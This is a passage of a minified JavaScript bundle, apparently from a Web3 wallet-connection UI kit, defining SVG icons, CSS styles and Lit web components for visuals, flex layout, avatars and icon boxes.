    d="m46.69 21.06-.94-.35.94.35a3 3 0 0 0 0-2.12l-.94.35.94-.35a3.21 3.21 0 0 0-1.27-1.45c-.53-.36-1.25-.76-2.11-1.24l-.05-.03-6.32-3.51-.18-.1c-2.33-1.3-3.72-2.06-5.22-2.33a9 9 0 0 0-3.08 0c-1.5.27-2.9 1.04-5.22 2.33l-.17.1-6.33 3.51-.05.03c-.86.48-1.58.88-2.1 1.24-.54.37-1.04.81-1.28 1.45a3 3 0 0 0 0 2.12c.24.63.74 1.08 1.27 1.45.53.36 1.25.76 2.11 1.24l.05.03 6.33 3.51.17.1c2.33 1.3 3.72 2.06 5.22 2.32a9 9 0 0 0 3.08 0c1.5-.26 2.9-1.03 5.22-2.32l.18-.1 6.32-3.51.05-.03a26.9 26.9 0 0 0 2.1-1.24 3.21 3.21 0 0 0 1.28-1.45Z"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,I3=K`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#C653C6" rx="3" />
  <path
    fill="#fff"
    d="M20.03 15.22C20 15.6 20 16.07 20 17v2.8c0 1.14 0 1.7-.2 2.12-.15.31-.3.5-.58.71-.37.28-1.06.42-2.43.7-.59.12-1.11.29-1.6.51a9 9 0 0 0-4.35 4.36C10 30 10 32.34 10 37c0 4.66 0 7 .84 8.8a9 9 0 0 0 4.36 4.36C17 51 19.34 51 24 51h12c4.66 0 7 0 8.8-.84a9 9 0 0 0 4.36-4.36C50 44 50 41.66 50 37c0-4.66 0-7-.84-8.8a9 9 0 0 0-4.36-4.36c-.48-.22-1-.39-1.6-.5-1.36-.29-2.05-.43-2.42-.7-.27-.22-.43-.4-.58-.72-.2-.42-.2-.98-.2-2.11V17c0-.93 0-1.4-.03-1.78a9 9 0 0 0-8.19-8.19C31.4 7 30.93 7 30 7s-1.4 0-1.78.03a9 9 0 0 0-8.19 8.19Z"
  />
  <path
    fill="#E87DE8"
    d="M22 17c0-.93 0-1.4.04-1.78a7 7 0 0 1 6.18-6.18C28.6 9 29.07 9 30 9s1.4 0 1.78.04a7 7 0 0 1 6.18 6.18c.04.39.04.85.04 1.78v4.5a1.5 1.5 0 0 1-3 0V17c0-.93 0-1.4-.08-1.78a4 4 0 0 0-3.14-3.14C31.39 12 30.93 12 30 12s-1.4 0-1.78.08a4 4 0 0 0-3.14 3.14c-.08.39-.08.85-.08 1.78v4.5a1.5 1.5 0 0 1-3 0V17Z"
  />
  <path
    fill="#E87DE8"
    fill-rule="evenodd"
    d="M12 36.62c0-4.32 0-6.48.92-8.09a7 7 0 0 1 2.61-2.61C17.14 25 19.3 25 23.62 25h6.86c.46 0 .7 0 .9.02 2.73.22 4.37 2.43 4.62 4.98.27-2.7 2.11-5 5.02-5A6.98 6.98 0 0 1 48 31.98v5.4c0 4.32 0 6.48-.92 8.09a7 7 0 0 1-2.61 2.61c-1.61.92-3.77.92-8.09.92h-5.86c-.46 0-.7 0-.9-.02-2.73-.22-4.37-2.43-4.62-4.98-.26 2.58-1.94 4.82-4.71 4.99l-.7.01c-.55 0-.82 0-1.05-.02a7 7 0 0 1-6.52-6.52c-.02-.23-.02-.5-.02-1.05v-4.79Zm21.24-.27a4 4 0 1 0-6.48 0 31.28 31.28 0 0 1 1.57 2.23c.17.4.17.81.17 1.24V42.5a1.5 1.5 0 0 0 3 0V39.82c0-.43 0-.85.17-1.24.09-.2.58-.87 1.57-2.23Z"
    clip-rule="evenodd"
  />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,$3=K`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <path
      fill="#EB8B47"
      d="M0 24.9c0-9.25 0-13.88 1.97-17.33a15 15 0 0 1 5.6-5.6C11.02 0 15.65 0 24.9 0h10.2c9.25 0 13.88 0 17.33 1.97a15 15 0 0 1 5.6 5.6C60 11.02 60 15.65 60 24.9v10.2c0 9.25 0 13.88-1.97 17.33a15 15 0 0 1-5.6 5.6C48.98 60 44.35 60 35.1 60H24.9c-9.25 0-13.88 0-17.33-1.97a15 15 0 0 1-5.6-5.6C0 48.98 0 44.35 0 35.1V24.9Z"
    />
    <path
      stroke="#062B2B"
      stroke-opacity=".1"
      d="M.5 24.9c0-4.64 0-8.08.24-10.8.25-2.7.73-4.65 1.66-6.28A14.5 14.5 0 0 1 7.82 2.4C9.46 1.47 11.39 1 14.1.74A133 133 0 0 1 24.9.5h10.2c4.63 0 8.08 0 10.8.24 2.7.25 4.65.73 6.28 1.66a14.5 14.5 0 0 1 5.42 5.42c.93 1.63 1.41 3.57 1.66 6.28.24 2.72.24 6.16.24 10.8v10.2c0 4.63 0 8.08-.24 10.8-.25 2.7-.73 4.64-1.66 6.28a14.5 14.5 0 0 1-5.42 5.41c-1.63.94-3.57 1.42-6.28 1.67-2.72.24-6.17.24-10.8.24H24.9c-4.63 0-8.08 0-10.8-.24-2.7-.25-4.64-.73-6.28-1.67a14.5 14.5 0 0 1-5.42-5.4C1.47 50.53 1 48.6.74 45.88A133 133 0 0 1 .5 35.1V24.9Z"
    />
    <path
      fill="#FF974C"
      stroke="#fff"
      stroke-width="2"
      d="M39.2 29.2a13 13 0 1 0-18.4 0l1.3 1.28a12.82 12.82 0 0 1 2.1 2.39 6 6 0 0 1 .6 1.47c.2.76.2 1.56.2 3.17v11.24c0 1.08 0 1.61.13 2.12a4 4 0 0 0 .41.98c.26.45.64.83 1.4 1.6l.3.29c.65.65.98.98 1.36 1.09.26.07.54.07.8 0 .38-.11.7-.44 1.36-1.1l3.48-3.47c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.47-.48c-.65-.65-.98-.98-1.09-1.36a1.5 1.5 0 0 1 0-.8c.1-.38.44-.7 1.1-1.36l.47-.48c.65-.65.98-.98 1.09-1.36a1.5 1.5 0 0 0 0-.8c-.1-.38-.44-.7-1.1-1.36l-.48-.5c-.65-.64-.98-.97-1.08-1.35a1.5 1.5 0 0 1 0-.79c.1-.38.42-.7 1.06-1.36l5.46-5.55Z"
    />
    <circle cx="30" cy="17" r="4" fill="#EB8B47" stroke="#fff" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="a"><path fill="#fff" d="M0 0h60v60H0z" /></clipPath>
  </defs>
</svg> `,O3=K`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#00ACE6" rx="30" />
    <circle cx="64" cy="39" r="50" fill="#1AC6FF" stroke="#fff" stroke-width="2" />
    <circle cx="78" cy="30" r="50" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="72" cy="15" r="35" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-17" r="45" stroke="#fff" stroke-width="2" />
    <circle cx="34" cy="-5" r="50" stroke="#fff" stroke-width="2" />
    <circle cx="30" cy="45" r="4" fill="#4DD2FF" stroke="#fff" stroke-width="2" />
    <circle cx="39.5" cy="27.5" r="4" fill="#80DFFF" stroke="#fff" stroke-width="2" />
    <circle cx="16" cy="24" r="4" fill="#19C6FF" stroke="#fff" stroke-width="2" />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#062B2B" stroke-opacity=".1" rx="29.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="30" /></clipPath>
  </defs>
</svg>`,P3=K`<svg fill="none" viewBox="0 0 60 60">
  <g clip-path="url(#a)">
    <rect width="60" height="60" fill="#C653C6" rx="3" />
    <path
      fill="#E87DE8"
      stroke="#fff"
      stroke-width="2"
      d="M52.1 47.34c0-4.24-1.44-9.55-5.9-12.4a2.86 2.86 0 0 0-1.6-3.89v-.82c0-1.19-.52-2.26-1.35-3a4.74 4.74 0 0 0-2.4-6.26v-5.5a11.31 11.31 0 1 0-22.63 0v2.15a3.34 3.34 0 0 0-1.18 5.05 4.74 4.74 0 0 0-.68 6.44A5.22 5.22 0 0 0 14 35.92c-3.06 4.13-6.1 8.3-6.1 15.64 0 2.67.37 4.86.74 6.39a20.3 20.3 0 0 0 .73 2.39l.02.04v.01l.92-.39-.92.4.26.6h38.26l.3-.49-.87-.51.86.5.02-.01.03-.07a16.32 16.32 0 0 0 .57-1.05c.36-.72.85-1.74 1.33-2.96a25.51 25.51 0 0 0 1.94-9.07Z"
    />
    <path
      fill="#fff"
      fill-rule="evenodd"
      d="M26.5 29.5c-3-.5-5.5-3-5.5-7v-7c0-.47 0-.7.03-.9a3 3 0 0 1 2.58-2.57c.2-.03.42-.03.89-.03 2 0 2.5-2.5 2.5-2.5s0 2.5 2.5 2.5c1.4 0 2.1 0 2.65.23a3 3 0 0 1 1.62 1.62c.23.55.23 1.25.23 2.65v6c0 4-3 7-6.5 7 1.35.23 4 0 6.5-2v9.53C34 38.5 31.5 40 28 40s-6-1.5-6-2.97L24 34l2.5 1.5v-6ZM26 47h4.5c2.5 0 3 4 3 5.5h-3l-1-1.5H26v-4Zm-6.25 5.5H24V57h-8c0-1 1-4.5 3.75-4.5Z"
      clip-rule="evenodd"
    />
  </g>
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
  <defs>
    <clipPath id="a"><rect width="60" height="60" fill="#fff" rx="3" /></clipPath>
  </defs>
</svg> `,D3=K`<svg fill="none" viewBox="0 0 60 60">
  <rect width="60" height="60" fill="#794CFF" rx="3" />
  <path
    fill="#987DE8"
    stroke="#fff"
    stroke-width="2"
    d="M33 22.5v-1H16v5H8.5V36H13v-5h3v7.5h17V31h1v7.5h17v-17H34v5h-1v-4Z"
  />
  <path fill="#fff" d="M37.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M42.5 25h5v10h-5z" />
  <path fill="#fff" d="M19.5 25h10v10h-10z" />
  <path fill="#4019B2" d="M24.5 25h5v10h-5z" />
  <path fill="#fff" d="M12 30.5h4V37h-4v-6.5Z" />
  <rect width="59" height="59" x=".5" y=".5" stroke="#fff" stroke-opacity=".1" rx="2.5" />
</svg>`,R3=K`<svg
  viewBox="0 0 60 60"
  fill="none"
>
  <g clip-path="url(#1)">
    <rect width="60" height="60" rx="30" fill="#00ACE6" />
    <path
      d="M59 73C59 89.0163 46.0163 102 30 102C13.9837 102 1 89.0163 1 73C1 56.9837 12 44 30 44C48 44 59 56.9837 59 73Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M18.6904 19.9015C19.6264 15.3286 23.3466 11.8445 27.9708 11.2096C29.3231 11.024 30.6751 11.0238 32.0289 11.2096C36.6532 11.8445 40.3733 15.3286 41.3094 19.9015C41.4868 20.7681 41.6309 21.6509 41.7492 22.5271C41.8811 23.5041 41.8811 24.4944 41.7492 25.4715C41.6309 26.3476 41.4868 27.2304 41.3094 28.097C40.3733 32.6699 36.6532 36.154 32.0289 36.7889C30.6772 36.9744 29.3216 36.9743 27.9708 36.7889C23.3466 36.154 19.6264 32.6699 18.6904 28.097C18.513 27.2304 18.3689 26.3476 18.2506 25.4715C18.1186 24.4944 18.1186 23.5041 18.2506 22.5271C18.3689 21.6509 18.513 20.7681 18.6904 19.9015Z"
      fill="#1AC6FF"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="24.5" cy="23.5" r="1.5" fill="white" />
    <circle cx="35.5" cy="23.5" r="1.5" fill="white" />
    <path
      d="M31 20L28 28H32"
      stroke="white"
      stroke-width="2"
      stroke-linecap="round"
      stroke-linejoin="round"
    />
  </g>
  <rect x="0.5" y="0.5" width="59" height="59" rx="29.5" stroke="white" stroke-opacity="0.1" />
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" rx="30" fill="white" />
    </clipPath>
  </defs>
</svg> `,N3=K`<svg viewBox="0 0 60 60" fill="none">
  <g clip-path="url(#1)">
    <path
      d="M0 24.9C0 15.6485 0 11.0228 1.97053 7.56812C3.3015 5.23468 5.23468 3.3015 7.56812 1.97053C11.0228 0 15.6485 0 24.9 0H35.1C44.3514 0 48.9772 0 52.4319 1.97053C54.7653 3.3015 56.6985 5.23468 58.0295 7.56812C60 11.0228 60 15.6485 60 24.9V35.1C60 44.3514 60 48.9772 58.0295 52.4319C56.6985 54.7653 54.7653 56.6985 52.4319 58.0295C48.9772 60 44.3514 60 35.1 60H24.9C15.6485 60 11.0228 60 7.56812 58.0295C5.23468 56.6985 3.3015 54.7653 1.97053 52.4319C0 48.9772 0 44.3514 0 35.1V24.9Z"
      fill="#794CFF"
    />
    <path
      d="M0.5 24.9C0.5 20.2652 0.50047 16.8221 0.744315 14.105C0.987552 11.3946 1.46987 9.45504 2.40484 7.81585C3.69145 5.56019 5.56019 3.69145 7.81585 2.40484C9.45504 1.46987 11.3946 0.987552 14.105 0.744315C16.8221 0.50047 20.2652 0.5 24.9 0.5H35.1C39.7348 0.5 43.1779 0.50047 45.895 0.744315C48.6054 0.987552 50.545 1.46987 52.1841 2.40484C54.4398 3.69145 56.3086 5.56019 57.5952 7.81585C58.5301 9.45504 59.0124 11.3946 59.2557 14.105C59.4995 16.8221 59.5 20.2652 59.5 24.9V35.1C59.5 39.7348 59.4995 43.1779 59.2557 45.895C59.0124 48.6054 58.5301 50.545 57.5952 52.1841C56.3086 54.4398 54.4398 56.3086 52.1841 57.5952C50.545 58.5301 48.6054 59.0124 45.895 59.2557C43.1779 59.4995 39.7348 59.5 35.1 59.5H24.9C20.2652 59.5 16.8221 59.4995 14.105 59.2557C11.3946 59.0124 9.45504 58.5301 7.81585 57.5952C5.56019 56.3086 3.69145 54.4398 2.40484 52.1841C1.46987 50.545 0.987552 48.6054 0.744315 45.895C0.50047 43.1779 0.5 39.7348 0.5 35.1V24.9Z"
      stroke="#062B2B"
      stroke-opacity="0.1"
    />
    <path
      d="M35.1403 31.5016C35.1193 30.9637 35.388 30.4558 35.8446 30.1707C36.1207 29.9982 36.4761 29.8473 36.7921 29.7685C37.3143 29.6382 37.8664 29.7977 38.2386 30.1864C38.8507 30.8257 39.3004 31.6836 39.8033 32.408C40.2796 33.0942 41.4695 33.2512 41.9687 32.5047C42.4839 31.7341 42.9405 30.8229 43.572 30.1399C43.9375 29.7447 44.4866 29.5756 45.0111 29.6967C45.3283 29.7701 45.6863 29.9147 45.9655 30.0823C46.4269 30.3595 46.7045 30.8626 46.6928 31.4008C46.6731 32.3083 46.3764 33.2571 46.2158 34.1473C46.061 35.0048 46.9045 35.8337 47.7592 35.664C48.6464 35.4878 49.5899 35.1747 50.497 35.1391C51.0348 35.1181 51.5427 35.3868 51.8279 35.8433C52.0004 36.1195 52.1513 36.4749 52.2301 36.7908C52.3604 37.3131 52.2009 37.8651 51.8121 38.2374C51.1729 38.8495 50.3151 39.2991 49.5908 39.8019C48.9046 40.2782 48.7473 41.4683 49.4939 41.9675C50.2644 42.4827 51.1757 42.9393 51.8587 43.5708C52.2539 43.9362 52.423 44.4854 52.3018 45.0099C52.2285 45.3271 52.0839 45.6851 51.9162 45.9642C51.6391 46.4257 51.1359 46.7032 50.5978 46.6916C49.6903 46.6719 48.7417 46.3753 47.8516 46.2146C46.9939 46.0598 46.1648 46.9035 46.3346 47.7583C46.5108 48.6454 46.8239 49.5888 46.8594 50.4958C46.8805 51.0336 46.6117 51.5415 46.1552 51.8267C45.879 51.9992 45.5236 52.15 45.2077 52.2289C44.6854 52.3592 44.1334 52.1997 43.7611 51.8109C43.1491 51.1718 42.6996 50.314 42.1968 49.5897C41.7203 48.9034 40.5301 48.7463 40.0309 49.493C39.5157 50.2634 39.0592 51.1746 38.4278 51.8574C38.0623 52.2527 37.5132 52.4218 36.9887 52.3006C36.6715 52.2273 36.3135 52.0826 36.0343 51.915C35.5729 51.6379 35.2953 51.1347 35.307 50.5966C35.3267 49.6891 35.6233 48.7405 35.7839 47.8505C35.9388 46.9928 35.0951 46.1636 34.2402 46.3334C33.3531 46.5096 32.4098 46.8227 31.5028 46.8582C30.9649 46.8793 30.457 46.6105 30.1719 46.154C29.9994 45.8778 29.8485 45.5224 29.7697 45.2065C29.6394 44.6842 29.7989 44.1322 30.1877 43.7599C30.8269 43.1479 31.6847 42.6982 32.4091 42.1954C33.0954 41.7189 33.2522 40.5289 32.5056 40.0297C31.7351 39.5145 30.824 39.058 30.1411 38.4265C29.7459 38.0611 29.5768 37.5119 29.698 36.9875C29.7713 36.6702 29.9159 36.3122 30.0836 36.0331C30.3607 35.5717 30.8638 35.2941 31.402 35.3058C32.3095 35.3255 33.2583 35.6221 34.1485 35.7828C35.006 35.9376 35.8349 35.094 35.6652 34.2393C35.489 33.3521 35.1759 32.4087 35.1403 31.5016Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <path
      d="M20.7706 8.22357C20.9036 7.51411 21.5231 7 22.2449 7H23.7551C24.4769 7 25.0964 7.51411 25.2294 8.22357C25.5051 9.69403 25.4829 11.6321 27.1202 12.2606C27.3092 12.3331 27.4958 12.4105 27.6798 12.4926C29.2818 13.2072 30.6374 11.8199 31.8721 10.9752C32.4678 10.5676 33.2694 10.6421 33.7798 11.1525L34.8477 12.2204C35.3581 12.7308 35.4326 13.5323 35.025 14.128C34.1802 15.3627 32.7931 16.7183 33.5077 18.3202C33.5898 18.5043 33.6672 18.6909 33.7398 18.88C34.3683 20.5171 36.3061 20.4949 37.7764 20.7706C38.4859 20.9036 39 21.5231 39 22.2449V23.7551C39 24.4769 38.4859 25.0964 37.7764 25.2294C36.3061 25.5051 34.3685 25.483 33.7401 27.1201C33.6675 27.3093 33.59 27.4961 33.5079 27.6803C32.7934 29.282 34.1803 30.6374 35.025 31.8719C35.4326 32.4677 35.3581 33.2692 34.8477 33.7796L33.7798 34.8475C33.2694 35.3579 32.4678 35.4324 31.8721 35.0248C30.6376 34.1801 29.2823 32.7934 27.6806 33.508C27.4962 33.5903 27.3093 33.6678 27.12 33.7405C25.483 34.3688 25.5051 36.3062 25.2294 37.7764C25.0964 38.4859 24.4769 39 23.7551 39H22.2449C21.5231 39 20.9036 38.4859 20.7706 37.7764C20.4949 36.3062 20.517 34.3688 18.88 33.7405C18.6908 33.6678 18.5039 33.5903 18.3196 33.5081C16.7179 32.7936 15.3625 34.1804 14.1279 35.0251C13.5322 35.4327 12.7307 35.3582 12.2203 34.8478L11.1524 33.7799C10.642 33.2695 10.5675 32.4679 10.9751 31.8722C11.8198 30.6376 13.2067 29.2822 12.4922 27.6804C12.41 27.4962 12.3325 27.3093 12.2599 27.1201C11.6315 25.483 9.69392 25.5051 8.22357 25.2294C7.51411 25.0964 7 24.4769 7 23.7551V22.2449C7 21.5231 7.51411 20.9036 8.22357 20.7706C9.69394 20.4949 11.6317 20.5171 12.2602 18.88C12.3328 18.6909 12.4103 18.5042 12.4924 18.3201C13.207 16.7181 11.8198 15.3625 10.975 14.1278C10.5674 13.5321 10.6419 12.7305 11.1523 12.2201L12.2202 11.1522C12.7306 10.6418 13.5322 10.5673 14.1279 10.9749C15.3626 11.8197 16.7184 13.2071 18.3204 12.4925C18.5044 12.4105 18.6909 12.3331 18.8799 12.2606C20.5171 11.6321 20.4949 9.69403 20.7706 8.22357Z"
      fill="#906EF7"
      stroke="white"
      stroke-width="2"
    />
    <circle cx="23" cy="23" r="6" fill="#794CFF" stroke="white" stroke-width="2" />
    <circle cx="41" cy="41" r="4" fill="#794CFF" stroke="white" stroke-width="2" />
  </g>
  <defs>
    <clipPath id="1">
      <rect width="60" height="60" fill="white" />
    </clipPath>
  </defs>
</svg> `,k3=q`
  :host {
    display: block;
    width: 55px;
    height: 55px;
  }
`;var Dp=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};const M3={browser:_3,dao:E3,defi:C3,defiAlt:S3,eth:A3,layers:T3,lock:I3,login:$3,network:O3,nft:P3,noun:D3,profile:R3,system:N3};let ia=class extends H{constructor(){super(...arguments),this.name="browser"}render(){return $`${M3[this.name]}`}};ia.styles=[pe,k3];Dp([O()],ia.prototype,"name",void 0);ia=Dp([z("wui-visual")],ia);/**
 * @license
 * Copyright 2018 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */const ve=t=>t??rt,Be={getSpacingStyles(t,e){if(Array.isArray(t))return t[e]?`var(--wui-spacing-${t[e]})`:void 0;if(typeof t=="string")return`var(--wui-spacing-${t})`},getFormattedDate(t){return new Intl.DateTimeFormat("en-US",{month:"short",day:"numeric"}).format(t)},getHostName(t){return new URL(t).hostname},getTruncateString({string:t,charsStart:e,charsEnd:n,truncate:r}){return t.length<=e+n?t:r==="end"?`${t.substring(0,e)}...`:r==="start"?`...${t.substring(t.length-n)}`:`${t.substring(0,Math.floor(e))}...${t.substring(t.length-Math.floor(n))}`},generateAvatarColors(t){const n=t.toLowerCase().replace(/^0x/iu,"").substring(0,6),r=this.hexToRgb(n),o=[];for(let i=0;i<5;i+=1){const a=this.tintColor(r,.15*i);o.push(`rgb(${a[0]}, ${a[1]}, ${a[2]})`)}return`
    --local-color-1: ${o[0]};
    --local-color-2: ${o[1]};
    --local-color-3: ${o[2]};
    --local-color-4: ${o[3]};
    --local-color-5: ${o[4]};
   `},hexToRgb(t){const e=parseInt(t,16),n=e>>16&255,r=e>>8&255,o=e&255;return[n,r,o]},tintColor(t,e){const[n,r,o]=t,i=Math.round(n+(255-n)*e),a=Math.round(r+(255-r)*e),s=Math.round(o+(255-o)*e);return[i,a,s]},isNumber(t){return{number:/^[0-9]+$/u}.number.test(t)},getColorTheme(t){return t||(typeof window<"u"&&window.matchMedia?window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light":"dark")}},U3=q`
  :host {
    display: flex;
    width: inherit;
    height: inherit;
  }
`;var Ft=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let bt=class extends H{render(){return this.style.cssText=`
      flex-direction: ${this.flexDirection};
      flex-wrap: ${this.flexWrap};
      flex-basis: ${this.flexBasis};
      flex-grow: ${this.flexGrow};
      flex-shrink: ${this.flexShrink};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      column-gap: ${this.columnGap&&`var(--wui-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--wui-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--wui-spacing-${this.gap})`};
      padding-top: ${this.padding&&Be.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Be.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Be.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Be.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Be.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Be.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Be.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Be.getSpacingStyles(this.margin,3)};
    `,$`<slot></slot>`}};bt.styles=[pe,U3];Ft([O()],bt.prototype,"flexDirection",void 0);Ft([O()],bt.prototype,"flexWrap",void 0);Ft([O()],bt.prototype,"flexBasis",void 0);Ft([O()],bt.prototype,"flexGrow",void 0);Ft([O()],bt.prototype,"flexShrink",void 0);Ft([O()],bt.prototype,"alignItems",void 0);Ft([O()],bt.prototype,"justifyContent",void 0);Ft([O()],bt.prototype,"columnGap",void 0);Ft([O()],bt.prototype,"rowGap",void 0);Ft([O()],bt.prototype,"gap",void 0);Ft([O()],bt.prototype,"padding",void 0);Ft([O()],bt.prototype,"margin",void 0);bt=Ft([z("wui-flex")],bt);const B3=q`
  :host {
    display: block;
    width: var(--wui-icon-box-size-xl);
    height: var(--wui-icon-box-size-xl);
    border-radius: var(--wui-border-radius-3xl);
    box-shadow: 0 0 0 8px var(--wui-gray-glass-005);
    overflow: hidden;
    position: relative;
  }

  :host([data-variant='generated']) {
    --mixed-local-color-1: var(--local-color-1);
    --mixed-local-color-2: var(--local-color-2);
    --mixed-local-color-3: var(--local-color-3);
    --mixed-local-color-4: var(--local-color-4);
    --mixed-local-color-5: var(--local-color-5);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host([data-variant='generated']) {
      --mixed-local-color-1: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-1)
      );
      --mixed-local-color-2: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-2)
      );
      --mixed-local-color-3: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-3)
      );
      --mixed-local-color-4: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-4)
      );
      --mixed-local-color-5: color-mix(
        in srgb,
        var(--w3m-color-mix) var(--w3m-color-mix-strength),
        var(--local-color-5)
      );
    }
  }

  :host([data-variant='generated']) {
    box-shadow: 0 0 0 8px var(--wui-gray-glass-005);
    background: radial-gradient(
      75.29% 75.29% at 64.96% 24.36%,
      #fff 0.52%,
      var(--mixed-local-color-5) 31.25%,
      var(--mixed-local-color-3) 51.56%,
      var(--mixed-local-color-2) 65.63%,
      var(--mixed-local-color-1) 82.29%,
      var(--mixed-local-color-4) 100%
    );
  }

  :host([data-variant='default']) {
    box-shadow: 0 0 0 8px var(--wui-gray-glass-005);
    background: radial-gradient(
      75.29% 75.29% at 64.96% 24.36%,
      #fff 0.52%,
      #f5ccfc 31.25%,
      #dba4f5 51.56%,
      #9a8ee8 65.63%,
      #6493da 82.29%,
      #6ebdea 100%
    );
  }
`;var kc=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Jr=class extends H{constructor(){super(...arguments),this.imageSrc=void 0,this.alt=void 0,this.address=void 0}render(){return $`${this.visualTemplate()}`}visualTemplate(){if(this.imageSrc)return this.dataset.variant="image",$`<wui-image src=${this.imageSrc} alt=${this.alt??"avatar"}></wui-image>`;if(this.address){this.dataset.variant="generated";const e=Be.generateAvatarColors(this.address);return this.style.cssText=e,null}return this.dataset.variant="default",null}};Jr.styles=[pe,B3];kc([O()],Jr.prototype,"imageSrc",void 0);kc([O()],Jr.prototype,"alt",void 0);kc([O()],Jr.prototype,"address",void 0);Jr=kc([z("wui-avatar")],Jr);const L3=q`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    position: relative;
    overflow: hidden;
    background-color: var(--wui-gray-glass-020);
    border-radius: var(--local-border-radius);
    box-shadow: 0 0 0 1px var(--local-border);
    width: var(--local-size);
    height: var(--local-size);
    min-height: var(--local-size);
    min-width: var(--local-size);
  }

  @supports (background: color-mix(in srgb, white 50%, black)) {
    :host {
      background-color: color-mix(in srgb, var(--local-bg-value) var(--local-bg-mix), transparent);
    }
  }
`;var qn=function(t,e,n,r){var o=arguments.length,i=o<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,a;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")i=Reflect.decorate(t,e,n,r);else for(var s=t.length-1;s>=0;s--)(a=t[s])&&(i=(o<3?a(i):o>3?a(e,n,i):a(e,n))||i);return o>3&&i&&Object.defineProperty(e,n,i),i};let Zt=class extends H{constructor(){super(...arguments),this.size="md",this.backgroundColor="accent-100",this.iconColor="accent-100",this.background="transparent",this.border=!1,this.borderColor="wui-color-bg-125",this.icon="copy"}render(){const e=this.iconSize||this.size,n=this.size==="lg",r=this.size==="xl",o=n?"12%":"16%",i=n?"xxs":r?"s":"3xl",a=this.background==="gray",s=this.background==="opaque",c=this.backgroundColor==="accent-100"&&s||this.backgroundColor==="success-100"&&s||this.backgroundColor==="error-100"&&s||this.backgroundColor==="inverse-100"&&s;let l=`var(--wui-color-${this.backgroundColor})`;return c?l=`var(--wui-icon-box-bg-${this.backgroundColor})`:a&&(l=`var(--wui-gray-${this.backgroundColor})`),this.style.cssText=`
       --local-bg-value: ${l};
       --local-bg-mix: ${c||a?"100%":o};
       --local-border-radius: var(--wui-border-radius-${i});
       --local-size: var(--wui-icon-box-size-${this.size});
       --local-border: ${this.borderColor==="wui-color-bg-125"?"2px":"1px"} solid ${this.border?`var(--${this.borderColor})`:"transparent"}
   `,$` <wui-icon color=${this.iconColor} size=${e} name=${this.icon}></wui-icon> `}};Zt.styles=[pe,Ye,L3];qn([O()],Zt.prototype,"size",void 0);qn([O()],Zt.prototype,"backgroundColor",void 0);qn([O()],Zt.prototype,"iconColor",void 0);qn([O()],Zt.prototype,"iconSize",void 0);qn([O()],Zt.prototype,"background",void 0);qn([O({type:Boolean})],Zt.prototype,"border",void 0);qn([O()],Zt.prototype,"borderColor",void 0);qn([O()],Zt.prototype,"icon",void 0);Zt=qn([z("wui-icon-box")],Zt);const j3=q`
  :host {
    display: block;
  }

  button {
    border-radius: var(--wui-border-radius-3xl);
    background: var(--wui-gray-glass-002);
    display: flex;
